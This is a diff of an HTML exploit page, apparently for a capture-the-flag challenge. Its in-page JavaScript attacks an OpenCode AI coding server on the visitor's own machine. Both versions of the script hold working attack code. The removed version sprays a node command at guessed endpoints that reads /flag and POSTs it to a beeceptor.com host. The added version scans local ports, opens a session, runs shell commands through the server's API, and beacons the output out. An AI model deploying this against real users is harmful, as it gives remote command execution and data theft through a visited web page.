@@ -1,67 +1,90 @@
 <!DOCTYPE html>
 <html>
+<head><title>OpenCode Exploit (Probe + Official API)</title></head>
 <body>
+<h1>Exploiting...</h1>
 <script>
-(function() {
-    const EXFIL = "http://1233334.free.beeceptor.com";
-    const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
-    function beacon(action, extra) {
-        new Image().src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
-    }
-    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL}/flag?run=${RUN_ID}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
-    const BASE = 'http://localhost:4096';
-    function postForm(url, data) {
-        let iframe = document.createElement('iframe');
-        iframe.name = 'hiddenFormTarget';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        let form = document.createElement('form');
-        form.method = 'POST';
-        form.action = url;
-        form.target = 'hiddenFormTarget';
-        form.style.display = 'none';
-        for (let [k, v] of Object.entries(data)) {
-            let input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = k;
-            input.value = v;
-            form.appendChild(input);
+// 你的接收服务器（确保 nc -lvn 2222 或 python -m http.server 2222）
+const EXFIL = "https://1233333.free.beeceptor.com/?log=";
+
+function log(msg, data) {
+    let text = msg + (data ? ": " + JSON.stringify(data).slice(0, 300) : "");
+    console.log(text);
+    new Image().src = EXFIL + encodeURIComponent(text);
+}
+
+// 常见端口（可自行增减）
+const PORTS = [4096, 8080, 3000, 5000, 7681, 8888, 9000];
+const HEALTH_PATH = "/global/health";
+
+// 探测端口是否存活（GET /global/health）
+async function probePort(port) {
+    try {
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 3000);
+        const res = await fetch(`http://127.0.0.1:${port}${HEALTH_PATH}`, { signal: controller.signal });
+        clearTimeout(timeout);
+        if (res.ok) {
+            const text = await res.text();
+            log(`[Port ${port}] Health check OK: ${text.slice(0, 100)}`);
+            return true;
         }
-        document.body.appendChild(form);
-        form.submit();
-        setTimeout(() => { form.remove(); iframe.remove(); }, 1000);
+    } catch (e) {
+        // 忽略错误
     }
-    beacon('start');
-    let probe = document.createElement('iframe');
-    probe.style.display = 'none';
-    probe.src = BASE + '/';
-    probe.onload = () => {
-        beacon('port_open');
-        const endpoints = ['/exec', '/cmd', '/api/exec', '/api/cmd', '/run', '/shell', '/api/shell', '/command'];
-        const paramNames = ['cmd', 'command', 'input', 'text'];
-        endpoints.forEach(ep => {
-            paramNames.forEach(pn => {
-                let data = {};
-                data[pn] = PAYLOAD;
-                postForm(BASE + ep, data);
-            });
+    return false;
+}
+
+// 通过官方 API 执行命令
+async function execCommand(port, command) {
+    const base = `http://127.0.0.1:${port}`;
+    try {
+        // 1. 创建 session
+        const sessionRes = await fetch(`${base}/session`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: '{}'
         });
-        // 也尝试 session 方式
-        postForm(BASE + '/session', {});
-        setTimeout(() => {
-            const ids = ['1', '2', '3', 'session', 'default'];
-            ids.forEach(id => {
-                paramNames.forEach(pn => {
-                    let data = {};
-                    data[pn] = PAYLOAD;
-                    postForm(BASE + `/session/${id}/shell`, data);
-                });
-            });
-        }, 1000);
-        beacon('exploit_sent');
-    };
-    probe.onerror = () => beacon('port_error');
-    document.body.appendChild(probe);
+        if (!sessionRes.ok) throw new Error(`Session HTTP ${sessionRes.status}`);
+        const session = await sessionRes.json();
+        const sessionId = session.id;
+        log(`[Port ${port}] Session created: ${sessionId}`);
+
+        // 2. 通过 shell 接口执行命令
+        const shellRes = await fetch(`${base}/session/${sessionId}/shell`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ agent: "build", command: command })
+        });
+        if (!shellRes.ok) throw new Error(`Shell HTTP ${shellRes.status}`);
+        const output = await shellRes.json(); // 假设返回执行结果
+        log(`[Port ${port}] Command output:`, output);
+        if (JSON.stringify(output).includes("flag{")) {
+            log(`[FLAG] ${JSON.stringify(output)}`);
+        }
+        return true;
+    } catch (err) {
+        log(`[Port ${port}] Error: ${err.message}`);
+        return false;
+    }
+}
+
+// 主流程
+(async () => {
+    log("Starting exploit: probe ports then official API");
+    let foundPort = null;
+    for (let port of PORTS) {
+        if (await probePort(port)) {
+            foundPort = port;
+            break;
+        }
+    }
+    if (foundPort) {
+        log(`Found OpenCode at port ${foundPort}, sending commands`);
+        await execCommand(foundPort, "chmod 644 /flag && cat /flag");
+    } else {
+        log("No OpenCode service found on common ports");
+    }
 })();
 </script>
 </body>
